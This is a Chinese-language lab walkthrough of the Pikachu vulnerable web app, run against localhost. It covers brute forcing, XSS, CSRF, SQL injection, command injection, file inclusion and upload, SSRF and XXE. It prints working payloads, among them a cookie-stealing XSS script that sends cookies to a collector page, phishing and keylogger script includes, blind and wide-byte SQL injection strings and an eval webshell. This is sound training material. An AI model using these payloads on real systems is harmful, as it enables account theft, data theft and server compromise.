## 暴力破解

### 基于表单的暴力破解

挂上代理，抓包，选择clusterbomb模式，设置两个payload

![image-20230720143541566](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720143541566.png)

分别将字典导入payload1和payload2，开始爆破

![image-20230720144032127](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144032127.png)

admin和123456登录成功

![image-20230720144158701](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144158701.png)

### 验证码绕过(on server)

输入用户名，密码，验证码进行抓包

发送到重放器发现，只更改用户名和密码，页面显示

![image-20230720144826758](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144826758.png)

再尝试改一下验证码，发现验证码错误

![image-20230720144952690](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144952690.png)

猜测一个验证码可以进行多次登录，直接将用户名和密码作为payload位置就可以

#### 原理，源码

![image-20230720145550989](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720145550989.png)

### 验证码绕过(on client)

根据提示，查看js代码

```javascript
var code; //在全局 定义验证码
    function createCode() {
        code = "";
        var codeLength = 5;//验证码的长度
        var checkCode = document.getElementById("checkCode");
        var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');//所有候选组成验证码的字符，当然也可以用中文的
        for (var i = 0; i < codeLength; i++) {
            var charIndex = Math.floor(Math.random() * 36);
            code += selectChar[charIndex];
        }
        //alert(code);
        if (checkCode) {
            checkCode.className = "code";
            checkCode.value = code;
        }
    }
    function validate() {
        var inputCode = document.querySelector('#bf_client .vcode').value;
        if (inputCode.length <= 0) {
            alert("请输入验证码！");
            return false;
        } else if (inputCode != code) {
            alert("验证码输入错误！");
            createCode();//刷新验证码
            return false;
        }
        else {
            return true;
        }
    }
    createCode();
```

我们可以发现验证码是JavaScript随机生成，点击一次函数运行一次生成一个相应的验证码。

将数据包发送到repeater，更改验证码进行发包依旧提示![image-20230720150339335](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150339335.png)

发现该验证码是javascript随机生成的，后台并没有进行校验，我们直接进行爆破就行了

### token防爆破?

输入用户名，密码，发现每次发包token就会更新一次

![image-20230720150804635](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150804635.png)

在密码输入框的下方多一个隐藏的输入框，记录的是token的信息，那么直接拿去burp上开始爆破

![image-20230720151146772](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151146772.png)

模式选择 pitchfork 勾选两个参数，一个是密码，一个是token

![image-20230720151403216](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151403216.png)

token参数选择递归提取类型

![image-20230720151756588](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151756588.png)

点击选项找到`检索-提取`进行添加，先点击获得响应，再选中token，重定向选择为总是

![image-20230720152159863](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152159863.png)

![image-20230720151931006](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151931006.png)

再将线程设置为单线程

![image-20230720152345438](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152345438.png)

根据长度判断

![image-20230720152522273](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152522273.png)

 爆破成功，得到admin的密码为123456

## 跨站脚本攻击(xss)

### 反射型XSS(get)

反射性，一次性的，刷新页面之后弹窗消失。GET是以url方式提交数据的。

```javascript
<script>alert(666)</script>
```

![image-20230725194934531](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725194934531.png)

### 反射型XSS(post)

 POST是以表单方式在请求体里面提交

![image-20230725195339871](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725195339871.png)

### 存储型XSS

存储型和反射型漏洞形成的原因是一样的，而存储型xss可以将脚本保存到后台，造成更大的伤害，也成为永久永久型xss。

永久型的xss，刷新页面后弹窗依旧存在

### DOM型xss

这里是标签的href属性，直接javascript伪协议

```
javascript:alert(6)
```

出现弹窗

### DOM型xss-x

查看源码

![image-20230726151924912](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230726151924912.png)

发现还是href属性，构造一个闭合或使用javascript伪协议

### XSS盲打

我们直接在输入框里插js代码，后端有漏洞就就可以`x`成功

```
<script>alert("xss")</script>
```

登录后台账号，发现被弹

![image-20230729132816754](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729132816754.png)

### XSS之过滤

绕过方法

前端有过滤的，可以直接修改前端代码

```
//大小写绕过
<sCRipt>aLErt("xss")<?/ScRipT>
//拼凑绕过
<scri <script >pt>alert("xss")</scri </script> pt>
//编码绕过
<img src=c onerror="alert("xss")"/> //img标签
//html编码
<img src=c onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;"> 
```

输入`<script>":#'@`

![image-20230729144851237](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729144851237.png)

应该是script被过滤了，大小写进行绕过

### xss之htmlspecialchars()函数

htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。

它可以将字符串中的特殊字符（如`<>`等）转换为了HTML实体，以防止跨站点脚本攻击（XSS）

输入`6666;"'<>`,查看源码，发现只有单引号`'`没有被编码

![image-20230729184054693](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184054693.png)

我们可以构造一个闭合，`' onclick='alert(666)'`,也可以输入`javascript:alert(666)`

### xss之href输出和js输出

输入`javascript:alert(666)`

js输出的源码

![image-20230729184822985](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184822985.png)

构造闭合`'</script><script>alert(666)</script>`

### xss的危害

#### 获取cookie

我们利用pikachu的xss后台获取cookie

构造payload

```
<script>document.location = 'http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=' +document.cookie;</script>
```

将他输入反射型xss中，打开后台

![image-20230729190509558](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729190509558.png)

#### 钓鱼获取账户密码

嵌入代码

```
<script src="http://127.0.0.1/pikachu/pkxss/xfish/fish.php"></script>
```

会弹出一个登录框

![image-20230729191017804](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729191017804.png)

我们输入账号密码，数据会存到后台可以进行查看

#### 获取键盘记录

同源策略规定，两个不同域名之间不能使用JS进行相互操作。

所以我们需要允许跨域访问

![image-20230729201339674](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201339674.png)

嵌入代码

```
<script src="http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js"></script>
```

打开控制台，在页面随便敲键盘，在后台可以看到输入数据

![image-20230729201539875](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201539875.png)

## CSRF(跨站请求伪造)

### 概述

CSRF的攻击场景中攻击者会伪造一个请求(这个请求一般是一 个链接)，
 然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了。

csrf攻击前，首先需要用户的权限，再诱导用户再点击这个请求完成攻击。

csrf是借用用户的权限进行攻击，xss是直接盗用用户的身份在进行攻击。

### CSRF(get/post)

GET型

进入修改信息的界面，提交修改信息的请求会在url中体现

```
http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=1&phonenum=&add=&email=&submit=submit
```

我们在url中直接修改参数就可以了

POST型

post型是通过表单进行请求

我们可以利用bp抓包工具生成一个csrf poc

![image-20230731200210267](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200210267.png)

![image-20230731200242543](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200242543.png)

我们直接在浏览器运行一下

![image-20230731200408502](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200408502.png)

提交申请，我们直接会跳转到个人中心，并且信息也被修改了

![image-20230731200625952](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200625952.png)

### CSRF(Token)

在修改信息时，可以在加一个token参数（随机，每次都不一样）

```
http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=2&phonenum=&add=&email=&token=1436064c7a4e2888e1609686874&submit=submit
```

每个token只能用一次，所以我们只能在修改信息前进行抓包，再修改信息。所以，token是防止csrf的一种方式。

## SQL注入

### 概述

SQL注入漏洞就是，前端的数据传到后台进行处理时，因没有做严格的过滤，导致数据中的sql语句执行，数据库被攻击。

### 数字型注入

数字型不用考虑闭合`id=1 or 1=1#`

![image-20230806154234855](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154234855.png)

### 字符型注入

后台查询语句是`select id,email from member where username='$name'`

![image-20230806154412848](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154412848.png)

```
name=kobe' //mysql报错
name=kobe'' //页面正常，判断为字符型
name=kobe' or 1=1# //回显所有数据
```

![image-20230806154906784](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154906784.png)

### 搜索型注入

后台查询语句

![image-20230806155415980](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155415980.png)

```
select username,id,email from member where username like '%$name%'
```

构造闭合

```
kobe%' or 1=1# //回显所有信息
```

![image-20230806155816877](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155816877.png)

### insert/update注入

后台语句

![image-20230806160254337](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806160254337.png)

```
insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')
```

这个insert语句我们直接就在`住址(Add)`这个参数进行注入，闭合前面的sql只需要加入`'$payload)`(前后分别加入单引号和右括号)

我们利用updatexml()函数进行报错注入

```
111' and updatexml(1,concat(0x7e,(select database()),0x7e),1))#
```

concat是将符号与字符拼接在一起

0x7e是16进制,是这个符号`~`

![image-20230806162153532](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162153532.png)

### delete注入

后台语句

![image-20230806162335917](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162335917.png)

```
delete from message where id={$_GET['id']}
```

![image-20230806162541721](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162541721.png)

这是数字型不需要进行闭合

其余跟insert注入是一样的

### http header 注入

以下是一些常见的请求header：

1. Accept: 指定客户端能够接收的数据类型，例如text/html、image/jpeg等。

2. Accept-Encoding: 指定客户端能够接受的编码方式，例如gzip、deflate等。

3. Accept-Language: 指定客户端接受的语言类型，例如en-US，zh-CN等。

4. Connection: 指定客户端与服务器的连接类型，例如keep-alive、close等。

5. Host: 指定请求的服务器的域名和端口号。
6.  User-Agent: 指定客户端使用的浏览器类型及版本号。

![image-20230806163203127](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163203127.png)

后台语句

![image-20230806163236950](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163236950.png)

构造闭合

```
1'and updatexml(1,concat(0x7e,(select version()),0x7e),1)--'
```

![image-20230806164734474](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806164734474.png)

### 基于boolian的盲注

布尔盲注就是猜测，根据页面返回的true和flase猜数据库总数，猜数据库长度，猜数据库名字，猜表和字段

输入`kobe`用户存在，而输入`66`用户不存在，判断可能存在布尔盲注

我们可以猜与数据库的长度

```
kobe' and length(database())=6# 
kobe' and length(database())=7# 
```

当长度等于6时，提示用户不存在，等于7时，正确返回数据，说明数据库长度为7

我们再用burp爆破数据库的名称，构造payload

```
kobe' and substr(database(),1,1)='a'#
substr()是截取字符串的函数
```

发送到爆破模块，设置位置

![image-20230806171336783](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171336783.png)

第一个位置

![image-20230806171418469](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171418469.png)

第二个位置

![image-20230806171440400](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171440400.png)

按照顺序拼写出pikachu

![image-20230806171519438](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171519438.png)

### 基于时间的盲注

后台语句

![image-20230806171713131](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171713131.png)

利用sleep()函数和返回时间进行判断是否存在时间盲注

正常输入，反应时间时15毫秒

![image-20230806172038838](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172038838.png)

构造payload

```
kobe' and if(length(database())>1,sleep(6),1)#
```

![image-20230806172325802](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172325802.png)

花费了6秒，证明可能存在时间盲注

可判断数据库长度

```
kobe' and if(length(database())>6,sleep(6),1)# //执行了函数，延迟了6秒
kobe' and if(length(database())>7,sleep(6),1)# //没有执行延迟，证明长度是7
```

还可爆破数据库名称,跟布尔盲注是一样操作

```
kobe' and if(substr(database(),1,1)='p',sleep(3),1)#
```

### 宽字节注入(wide byte注入)

一个字节的字符叫做窄字节，两个字节及以上叫宽字节

宽字节注入是绕过sql防御的一种方法，为了防御sql注入，一些函数可以将单引号、双引号进行转义，转义就是再单引号、双引号前面加上转义字符（\）。

mysql使用的是GBK编码（两个字节），`\`的十六进制编码是%5c，前面加%df就可以组成一个繁体字`運`

过程：

id=1%df’（浏览器自动进行url编码%27）->%df%27
 根据以上分析，发生如下转换：
 %df%27—>(check_addslashes)—>%df%5c%27---->(GBK)---->運

最后单引号形成闭合

构造payload

```
kobe%df' or 1=1# //回显所有信息
```

![image-20230806174819990](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806174819990.png)

接着还可以判断字段数

```
kobe%df' order by 2 //无报错
kobe%df' order by 3 //有报错
```

联合查询进行查询数据库和版本

```
kobe%df' union select database(),version() #
```

![image-20230806175239286](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806175239286.png)

## RCE

RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统

### exec“ping”

给了一个ping的框

尝试ping

```
127.0.0.1 & whoami //两条命令都可以执行
```

同时执行多条命令的语法格式

```
a & b   //先执行a再执行b，无论a是否执行成功(按位与)
a && b  //先执行a再执行b，只有a执行成功才会执行b(逻辑与)
a || b  //先执行a再执行b，只有a执行失败才会执行b(逻辑或)
a | b   //将a的执行结果传递给b(管道符)
```

### exec“evel”

eval() 函数把字符串按照 PHP 代码来计算。

该字符串必须是合法的 PHP 代码，且必须以分号结尾。

可以输入`phpinfo();`

![image-20230806212321142](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806212321142.png)

后端代码是直接可以执行的

`eval($_POST['txt']`也算是一句话木马，我们可以通过蚁剑进行连接

这时候提示数据为空，是因为还有参数没有进行提交

![image-20230806213006470](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213006470.png)

我们添加一下

![image-20230806213211985](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213211985.png)

连接成功

![image-20230806213233214](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213233214.png)

## 文件包含漏洞

首先，需要将服务器文件包含功能打开

![image-20230812153713038](C:/Users/86188/AppData/Roaming/Typora/typora-user-images/image-20230812153713038.png)

### 本地文件包含

只能够对服务器本地的文件进行包含，攻击者大多会读取系统配置文件等

![image-20230812152856968](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812152856968.png)

通过目录遍历可以读取本地文件：

```
../../1.txt
```

![image-20230812153029599](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153029599.png)

### 远程文件包含

可以通过url地址对远程的文件进行包含

php中有几个文件包含函数

```
include(),include_once()
require(),require_once()
```

可以在url中输入网址

![image-20230812153935437](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153935437.png)

![image-20230812153959732](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153959732.png)

还可以通过url的形式读取文件

![image-20230812154125229](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154125229.png)

## 不安全的文件下载

这是下载文件的url

![image-20230812154349392](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154349392.png)

如果后端没有进行文件名过滤，我们可以直接再filename下载服务器上的任意文件，通过目录遍历。

```
http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../1.txt
```

## 不安全的文件上传

### 客户端check

![image-20230812154954700](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154954700.png)

查看源码

![image-20230812155401123](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812155401123.png)

发现是前端校验，我们可以禁用js，然后就可以上传.php的文件

还可以利用抓包改后缀名

### 服务端check

我们可以上传图片，Content-Type: image/png

只需要将后缀名修改成php就行了。也可以上传php文件进行抓包，修改Content-Type。

### getimagesize()

getimagesize()：它是php提供的，通过对目标文件的16进制进行读取，通过该文件的前面几个字符串，来判断文件类型。

我们可以伪造文件头

![image-20230812163754016](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812163754016.png)

```
GIF89a
<?php phpinfo(); ?>
```

## 越权漏洞

如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作， 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。                

### 水平越权

用户本身可以修改别的用户的信息

url中的username是lucy，我们可以修改成lili

![image-20230812164129473](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164129473.png)

![image-20230812164311056](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164311056.png)

直接跳转到lili的页面，这叫做水平越权

### 垂直越权

用户可以拥有管理员的权限，对用户信息进行添加

我们先登管理员账号，得到添加信息的url

```
http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php
```

然后退出管理员账号，登录用户账号，访问这个url，依旧可以进行添加用户，这叫垂直越权。

## URL重定向

```
127.0.0.1/pikachu/vul/urlredirect/urlredirect.php?url=
```

可以在参数后面直接输入网站进行跳转

url跳转的危害：

钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站。

## SSRF(服务器端请求伪造)

其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。

```
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()
```

### SSRF(curl)

查看源码，利用的是curl_exec()函数

![image-20230813172942275](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813172942275.png)

### SSRF(file_get_contents)

![image-20230813173249389](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173249389.png)

```
php://filter/convert.base64-encode/resource=ssrf.php
```

![image-20230813173410632](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173410632.png)

利用伪协议进行读取文件内容

## XXE(xml外部实体注入)

xml是可扩展标记语言

```
<?xml version="1.0"?> //声明是xml
<!DOCTYPE note SYSTEM "note.dtd"> //外部实体声明
<note>
<to>Dave</to>
<from> Tom</from>
<head> Reminder </head>
<body>You are a good man</body>
</note>
```

判断是否有xxe回显漏洞

输入

```
<aa>aa</aa>
```

![image-20230813180132480](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813180132480.png)
